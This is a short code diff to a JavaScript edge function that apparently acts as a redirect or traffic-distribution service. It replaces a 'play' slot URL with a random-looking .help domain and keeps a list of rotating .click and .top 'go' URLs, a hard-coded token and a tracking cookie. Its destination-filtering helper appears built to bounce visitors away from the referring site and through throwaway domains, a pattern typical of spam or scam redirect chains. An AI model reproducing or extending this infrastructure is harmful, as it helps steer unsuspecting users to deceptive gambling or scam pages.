@@ -1,6 +1,6 @@
 export const config = { runtime: 'edge' };
 
-const CFG = {"slots": {"play": "https://roadchicken.pt/"}, "go_urls": ["https://monitorre.top/go/ref", "https://firespot.click/go/ref", "https://fintechfox.click/go/ref", "https://buffout.click/go/ref"], "go_token": "6c27a2676e6fb97970145a1c9daa1d717ea137c80518a24c", "go_cookie": "_kc"};
+const CFG = {"slots": {"play": "https://serffigjkjubycushrx.help/5k5wXV"}, "go_urls": ["https://monitorre.top/go/ref", "https://firespot.click/go/ref", "https://fintechfox.click/go/ref", "https://buffout.click/go/ref"], "go_token": "6c27a2676e6fb97970145a1c9daa1d717ea137c80518a24c", "go_cookie": "_kc"};
 function clean(v){return (v||'').replace(/[\x00-\x1f\x7f]/g,'').trim();}
 function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));const t=a[i];a[i]=a[j];a[j]=t;}return a;}
 function allowed(dest,nodes,ref,site,fb){let p;try{p=new URL(dest);}catch(_){return false;}if(p.protocol!=='https:')return false;const h=p.hostname.toLowerCase();if(fb&&ref){let rh='';try{rh=new URL(ref).hostname.toLowerCase();}catch(_){}if(rh&&h===rh)return true;}const bad=[site];for(const n of nodes){try{bad.push(new URL(n).hostname.toLowerCase());}catch(_){}}try{if(ref)bad.push(new URL(ref).hostname.toLowerCase());}catch(_){}for(const b of bad){if(b&&(h===b||h.endsWith('.'+b)))return false;}return true;}
